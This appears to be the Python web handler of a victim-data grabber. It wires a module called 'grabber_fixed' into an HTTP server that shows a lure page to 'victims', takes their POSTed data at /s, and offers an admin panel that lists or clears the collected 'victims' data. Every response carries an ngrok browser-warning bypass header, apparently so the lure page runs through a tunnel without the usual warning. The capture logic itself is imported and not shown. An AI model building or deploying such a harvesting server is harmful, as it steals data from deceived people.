from http.server import BaseHTTPRequestHandler
import json
import sys
import os

# Make sure the root directory is on the path so grabber_fixed can be imported
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        import grabber_fixed
        import urllib.parse
        import json
        
        parsed = urllib.parse.urlparse(self.path)
        
        # Admin Panel Route
        if parsed.path.startswith('/admin'):
            params = urllib.parse.parse_qs(parsed.query)
            if params.get('clear'):
                grabber_fixed.victims_data.clear()
                self.send_response(200)
                self.send_header("ngrok-skip-browser-warning", "true")
                self.end_headers()
                return
                
            if parsed.path == '/admin/data' or parsed.query: # API for admin data
                 self.send_response(200)
                 self.send_header("Content-type", "application/json")
                 self.send_header("ngrok-skip-browser-warning", "true")
                 self.end_headers()
                 self.wfile.write(json.dumps({"victims": grabber_fixed.victims_data}).encode())
                 return
                 
            # Serve Admin HTML
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.send_header("ngrok-skip-browser-warning", "true")
            self.end_headers()
            self.wfile.write(grabber_fixed.ADMIN_PANEL.encode())
            return
            
        # Victim Routes
        if self.path == '/go' or self.path == '/':
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.send_header("ngrok-skip-browser-warning", "true")
            self.end_headers()
            self.wfile.write(grabber_fixed.HTML_PAGE.encode("utf-8"))
            return
            
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        import grabber_fixed
        if self.path == '/s':
            grabber_fixed.VictimHandler.do_POST(self)
        else:
            self.send_response(404)
            self.end_headers()
